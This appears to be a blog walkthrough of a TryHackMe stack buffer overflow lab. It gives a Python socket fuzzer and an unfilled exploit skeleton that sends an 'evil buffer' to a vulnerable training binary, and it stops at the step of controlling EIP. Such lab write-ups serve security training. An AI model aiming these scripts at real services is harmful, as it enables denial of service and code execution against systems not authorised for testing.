---
title: TryHackMe BufferOverflow
description: Buffer Overflow Prep
categories:
 - tryhackme

tags: tryhackme Bufferoverflow

---

## Summary

Practice stack based buffer overflows!


## Starting Immunity Debugger

![](https://raw.githubusercontent.com/greenway71/greenway71.github.io/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_01_12.png)


https://raw.githubusercontent.com/greenway71/greenway71.github.io/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_01_12.png

Right-click the Immunity Debugger icon on the Desktop and choose "Run as administrator".


![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_02_29.png)

When Immunity loads, click the open file icon, or choose File -> Open. Navigate to the vulnerable-apps folder on the admin user's desktop, and then the "oscp" folder. Select the "oscp" (oscp.exe) binary and click "Open".

## Mona Configuration

Run these command in the input box at the bottom of the immunity Debugger window.

```
!mona config -set workingfolder c:\mona\%p

```
![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_03_54.png)


## Fuzzing

Run this python script to fuzz

```
#!/usr/bin/env python3

import socket, time, sys

ip = "MACHINE_IP"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)

```

![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_04_52.png)

Basically, this script is going to send increasingly long strings comprised of As. If the server gets crashed, the fuzzer should exit with an error message.
![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_05_45.png)

![](https://github.com/greenway71/greenway71.github.io/blob/340df137c36ee7d428465ec76f36121a57837ae7/Bufferoverflow-screenshot/Screenshot_2021-08-13_04_06_06.png)

## Crash Replication & Controlling EIP
```
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

